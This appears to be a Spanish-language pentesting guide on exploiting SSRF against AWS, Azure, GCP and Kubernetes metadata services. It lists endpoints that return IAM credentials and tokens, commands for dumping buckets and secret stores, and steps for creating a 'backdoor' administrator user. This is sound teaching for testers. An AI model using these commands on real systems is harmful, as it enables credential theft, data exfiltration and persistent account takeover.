# Entornos Cloud (AWS, Azure, GCP)

En entornos cloud, cada instancia (EC2, VM, pod) tiene acceso a un endpoint de metadata que devuelve información sobre la instancia, incluyendo credenciales temporales de IAM. Estas credenciales permiten interactuar con todos los servicios cloud de la cuenta.

```
SSRF → metadata endpoint → credenciales IAM → S3, EC2, Lambda, RDS...
                         → potencialmente compromiso completo de la cuenta
```

El endpoint solo es accesible desde la propia instancia (no desde internet), por eso el SSRF lo hace tan peligroso.

### AWS — Amazon Web Services

#### Endpoint de metadata

```
URL base: http://169.254.169.254/latest/
→ Solo accesible desde instancias EC2
→ No requiere autenticación en IMDSv1 (versión legacy)
→ IMDSv2 requiere un token previo (pero bypass es posible si la app hace peticiones arbitrarias)
```

#### IMDSv1 — Sin autenticación (el más frecuente en vulns)

```bash
# Información básica de la instancia
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/placement/region

# Información de red
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC_ADDR/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC_ADDR/vpc-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC_ADDR/subnet-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/MAC_ADDR/security-groups

# Roles IAM asignados
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Devuelve el nombre del rol, ej: "WebServerRole"

# CREDENCIALES TEMPORALES IAM ← El hallazgo más crítico
http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE_DEL_ROL
→ Devuelve JSON con:
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEJr...",  ← Session token (temporal)
  "Expiration": "2024-01-15T16:30:00Z"
}

# User-data (scripts de inicio — a veces contienen contraseñas/tokens)
http://169.254.169.254/latest/user-data

# Identidad de la instancia (documento firmado)
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/dynamic/instance-identity/signature
```

#### IMDSv2 — Con token (versión moderna, más segura)

```bash
# IMDSv2 requiere primero obtener un token con PUT
# Pero si la app hace peticiones HTTP arbitrarias, podemos incluir el header

# Paso 1: Obtener token (PUT request con header especial)
# Desde SSRF, si la app permite PUT y headers custom:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
→ Devuelve: TOKEN_VALUE

# Paso 2: Usar el token en peticiones al metadata
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
X-aws-ec2-metadata-token: TOKEN_VALUE

# Si la app no permite PUT o headers custom:
# → La instancia puede tener IMDSv1 habilitado también (hop fallback)
# → Algunas configuraciones permiten IMDSv1 como fallback
# → Buscar si la app tiene algún endpoint que haga PUT para ese header
```

#### Usar las credenciales IAM obtenidas

```bash
# Configurar las credenciales en el atacante
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEJr..."

# Verificar identidad y permisos
aws sts get-caller-identity
→ Muestra: Account ID, UserID, ARN del rol

# Enumerar permisos disponibles (qué puede hacer este rol)
aws iam list-attached-role-policies --role-name NOMBRE_ROL
aws iam get-role-policy --role-name NOMBRE_ROL --policy-name POLICY_NAME

# Herramienta automatizada para enumerar permisos
pip3 install enumerate-iam
python3 enumerate_iam.py --access-key AKID --secret-key SECRET --session-token TOKEN
```

#### Explotación post-SSRF en AWS

```bash
# S3 — Listar y descargar buckets
aws s3 ls                          # Listar todos los buckets accesibles
aws s3 ls s3://BUCKET_NAME/        # Contenido de un bucket
aws s3 cp s3://BUCKET_NAME/secret.txt .  # Descargar archivo
aws s3 sync s3://BUCKET_NAME/ ./local/   # Sincronizar bucket completo

# EC2 — Información de instancias
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-vpcs
aws ec2 describe-subnets

# Secrets Manager — Secretos almacenados
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NOMBRE_SECRETO
→ Devuelve: contraseñas, API keys, tokens

# Parameter Store (SSM)
aws ssm describe-parameters
aws ssm get-parameter --name NOMBRE --with-decryption
aws ssm get-parameters-by-path --path / --recursive --with-decryption
→ También puede contener credenciales

# Lambda — Código de funciones
aws lambda list-functions
aws lambda get-function --function-name NOMBRE
# El código puede contener credenciales hardcodeadas
aws lambda get-function-configuration --function-name NOMBRE

# RDS — Bases de datos
aws rds describe-db-instances
aws rds describe-db-clusters
# Con los endpoints y credenciales de Secrets Manager → acceso directo a la DB

# IAM — Escalar privilegios si el rol tiene permisos de IAM
aws iam list-users
aws iam list-roles
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
→ Credenciales permanentes con admin → persistencia

# ECR — Imágenes de contenedores
aws ecr describe-repositories
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
# El código en las imágenes puede contener credenciales
```

### Azure — Microsoft Azure

#### Endpoint de metadata (IMDS)

```bash
# URL base del Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header requerido: Metadata: true
# Sin el header → error 400

# Si la app permite añadir headers custom al hacer la petición SSRF:
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Información de la instancia
http://169.254.169.254/metadata/instance?api-version=2021-02-01
→ Devuelve JSON con: subscriptionId, resourceGroup, vmId, location, vmSize...

# Identidad de la VM
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
→ Devuelve: access_token para la API de Azure Management

# Token para distintos recursos
# Azure Management API
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Azure Storage
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
# Key Vault
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
# Graph API
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/

# Scheduled events (revela info de la VM)
http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01

# Atestación (para verificar identidad de la VM)
http://169.254.169.254/metadata/attested/document?api-version=2020-09-01
```

#### Usar el token de Azure

```bash
# Configurar el token
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6..."

# Verificar la suscripción
curl -H "Authorization: Bearer $TOKEN" \
    https://management.azure.com/subscriptions?api-version=2020-01-01

# Listar grupos de recursos
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/SUB_ID/resourceGroups?api-version=2021-04-01"

# Listar VMs
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/SUB_ID/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01"

# Listar Storage Accounts
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/SUB_ID/providers/Microsoft.Storage/storageAccounts?api-version=2021-02-01"

# Listar Key Vaults
curl -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/SUB_ID/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"

# Obtener secretos del Key Vault (con token de vault.azure.net)
TOKEN_KV="..."  # token para resource=https://vault.azure.net
curl -H "Authorization: Bearer $TOKEN_KV" \
    "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"
curl -H "Authorization: Bearer $TOKEN_KV" \
    "https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.3"
```

### GCP — Google Cloud Platform

#### Endpoint de metadata

```bash
# URL base del Metadata Server
http://metadata.google.internal/computeMetadata/v1/
# Header requerido: Metadata-Flavor: Google

# Sin el header → respuesta 403 o error con mensaje sobre el header
# Versión sin header (legacy — funciona en algunas instancias):
http://metadata.google.internal/

# Información de la instancia
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/machine-type
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Información del proyecto
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/
# Los atributos del proyecto pueden contener: SSH keys, tokens, configuraciones

# Atributos de la instancia (a menudo contienen scripts de inicio con credenciales)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# SERVICE ACCOUNT TOKEN ← El hallazgo más crítico en GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
→ Devuelve:
{
  "access_token": "ya29.c.b0AXv0zTNp...",
  "expires_in": 3599,
  "token_type": "Bearer"
}

# Listar todas las service accounts de la instancia
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

#### Usar el token de GCP

```bash
TOKEN="ya29.c.b0AXv0zTNp..."

# Verificar el token
curl -H "Authorization: Bearer $TOKEN" \
    "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$TOKEN"

# GCP Resource Manager — Proyectos y permisos
curl -H "Authorization: Bearer $TOKEN" \
    "https://cloudresourcemanager.googleapis.com/v1/projects"

# GCS (Google Cloud Storage) — Listar buckets
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"

# Listar objetos de un bucket
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"

# Descargar objeto
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" -o file

# Compute Engine — Listar instancias
curl -H "Authorization: Bearer $TOKEN" \
    "https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/aggregated/instances"

# Cloud SQL — Listar bases de datos
curl -H "Authorization: Bearer $TOKEN" \
    "https://sqladmin.googleapis.com/sql/v1beta4/projects/PROJECT_ID/instances"

# Secret Manager — Secretos almacenados
curl -H "Authorization: Bearer $TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets"
curl -H "Authorization: Bearer $TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets/SECRET_NAME/versions/latest:access"
```

### Kubernetes en Cloud (EKS, GKE, AKS)

Cuando la app corre en un pod de Kubernetes, además del metadata del cloud, hay credenciales del pod:

```bash
# Token del Service Account del pod (montado automáticamente)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Con el token, acceder a la API de Kubernetes
curl -H "Authorization: Bearer $SA_TOKEN" \
    https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets
# → Dump de todos los secretos del namespace

# Variables de entorno del pod (a menudo contienen credenciales)
file:///proc/self/environ

# Acceder a la API de Kubernetes desde el SSRF
http://kubernetes.default.svc.cluster.local/api/v1/secrets
http://10.96.0.1/api/v1/namespaces/kube-system/secrets
```

### Flujo de explotación completo (AWS)

```
1. Confirmar SSRF
   url=http://INTERACTSH_URL → recibir petición DNS/HTTP

2. Acceder al metadata
   url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Obtener nombre del rol: "WebServerRole"

3. Obtener credenciales
   url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole
   → AccessKeyId, SecretAccessKey, Token

4. Configurar credenciales en el atacante
   export AWS_ACCESS_KEY_ID="AKIA..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."

5. Enumerar permisos
   aws sts get-caller-identity
   python3 enumerate_iam.py --access-key ... --secret-key ... --session-token ...

6. Escalar (según permisos disponibles)
   → s3:GetObject → dump de todos los buckets
   → secretsmanager:GetSecretValue → dump de secretos
   → iam:CreateUser → crear usuario permanente con AdministratorAccess
   → ec2:RunInstances → lanzar instancias propias en la cuenta
   → lambda:UpdateFunctionCode → modificar funciones Lambda → backdoor
```

### Resumen de endpoints de metadata

| Cloud       | URL                                                                                          | Header requerido          | Credenciales en                     |
| ----------- | -------------------------------------------------------------------------------------------- | ------------------------- | ----------------------------------- |
| **AWS**     | `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE`                      | Ninguno (IMDSv1)          | AccessKeyId, SecretAccessKey, Token |
| **Azure**   | `http://169.254.169.254/metadata/identity/oauth2/token?...resource=...`                      | `Metadata: true`          | access\_token (JWT)                 |
| **GCP**     | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` | access\_token                       |
| **K8s pod** | `file:///var/run/secrets/kubernetes.io/serviceaccount/token`                                 | Ninguno                   | JWT para API de K8s                 |

> Las credenciales IAM de AWS son temporales (expiran en horas), pero si el rol tiene `iam:CreateUser` + `iam:CreateAccessKey`, se pueden crear credenciales permanentes antes de que expiren las temporales.

> Aunque IMDSv2 de AWS requiere un token previo, muchas instancias antiguas o mal configuradas siguen respondiendo a IMDSv1. Siempre probar primero sin el token — si da 200, es IMDSv1.

> Azure y GCP requieren cabeceras específicas (`Metadata: true`, `Metadata-Flavor: Google`). Si la app SSRF no permite headers custom, buscar si hay algún endpoint de la propia app que ya incluya esas cabeceras en sus peticiones internas.
